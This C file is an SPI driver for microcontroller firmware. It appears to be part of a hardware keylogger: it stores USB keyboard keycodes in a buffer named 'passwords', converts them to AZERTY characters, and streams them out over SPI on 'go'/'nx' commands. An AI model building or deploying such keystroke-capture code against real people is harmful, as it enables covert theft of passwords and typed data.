//spi.c

#include "spi.h"
#include "rtt.h"
#include "usbh.h"
#include "vectors.h"
#include "usb_hid_keys.h"

#define OVR (SPI3->SR & SPI_SR_OVR)
#define TXE (SPI3->SR & SPI_SR_TXE)
#define RXNE (SPI3->SR & SPI_SR_RXNE)

/*
 * Mail Box
 */
#define MB_SIZE 253

static msg_t rmb_buffer[MB_SIZE];
static MAILBOX_DECL(rmb, rmb_buffer, MB_SIZE);

static msg_t wmb_buffer[MB_SIZE];
static MAILBOX_DECL(wmb, wmb_buffer, MB_SIZE);

/*
 * SPI TX buffers.
 */
#define MSG_SIZE 250  //nb byte useful
#define BUF_SIZE 125  //nb trame

uint16_t passwords[PASSWORD_BUFFER_SIZE];
int      password_index;

void spi_write(uint16_t *msg, int begin);
static THD_WORKING_AREA(waSpiMainLoop, 1024);

static void ThreadSpiMainLoop(void *p)
{
    (void)p;
    static int password_ptr = 0;
    msg_t      msg;

    chRegSetThreadName("SPI");

    for(;;) {
        //mailbox check
        chMBFetch(&rmb, &msg, TIME_INFINITE);

        //start
        if(msg == 0x676f) {
            spi_write(passwords, 0);
            password_ptr = 1;
            rtt_printf("START");
        }

        //next
        else if(msg == 0x6e78) {
            spi_write(passwords, MSG_SIZE * password_ptr);
            password_ptr++;
            rtt_printf("NEXT");
        }
    }
}

void spi_init(void)
{
    /*
     * SPI3 I/O pins setup.
     */
    palSetPadMode(GPIOC, GPIOC_SPI3_SCK, PAL_MODE_ALTERNATE(6));
    palSetPadMode(GPIOC, GPIOC_SPI3_MISO, PAL_MODE_ALTERNATE(6));
    palSetPadMode(GPIOC, GPIOC_SPI3_MOSI, PAL_MODE_ALTERNATE(6));
    palSetPadMode(GPIOA, GPIOA_SPI3_NSS, PAL_MODE_INPUT_PULLDOWN);

    /*
     * CONFIG SPI
     * 16bit
     * CPHA = 0, CPOL = 0
     * MSB-first
     * NSS Hardware
     * Motorola mode
     * Slave mode
     * Rx interupt on
     */
    RCC->APB1ENR |= RCC_APB1ENR_SPI3EN;     // Turn SPI3 clock on.
    SPI3->CR1 = 0;                          // SPI off while configuring it
    SPI3->CR2 = SPI_CR2_RXNEIE;             // RX interrupt if data present
    SPI3->CR1 = SPI_CR1_SPE | SPI_CR1_DFF;  // Enable SPI in slave mode.

    //enable interrupt
    NVIC->ISER[1] = (1 << 19);  // Position 51

    chThdCreateStatic(waSpiMainLoop, sizeof(waSpiMainLoop), NORMALPRIO, ThreadSpiMainLoop, 0);
}

void spi_write(uint16_t *msg, int begin)
{
    char input_left, input_right;
    for(int i = 0; i < MSG_SIZE; i += 2) {
        input_left  = hid2azerty(msg[begin + i]);
        input_right = hid2azerty(msg[begin + i + 1]);
        chMBPost(&wmb,
                 begin + i < password_index ? ((uint16_t)input_left << 8) | (uint16_t)input_right : 0,
                 TIME_INFINITE);
    }

    // Turn on Tx interrupt
    SPI3->CR2 |= SPI_CR2_TXEIE;  //TXEIE = 1
}

void SPI_IRQHandler(void)
{
    //Overrun flag
    if(OVR) {
        rtt_printf("Overrun !!!");
        chSysHalt("Overrun !!!!");
    }
    //Receive buffer not empty
    else if(RXNE) {
        chSysLockFromISR();
        chMBPostI(&rmb, SPI3->DR);
        chSysUnlockFromISR();
    }

    //Transfer buffer empty
    else if(TXE) {
        chSysLockFromISR();
        msg_t msg;
        if(chMBFetchI(&wmb, &msg) == MSG_OK)
            SPI3->DR = msg;
        else
            SPI3->CR2 &= ~SPI_CR2_TXEIE;  // Nothing else to transmit
        chSysUnlockFromISR();
    }
}
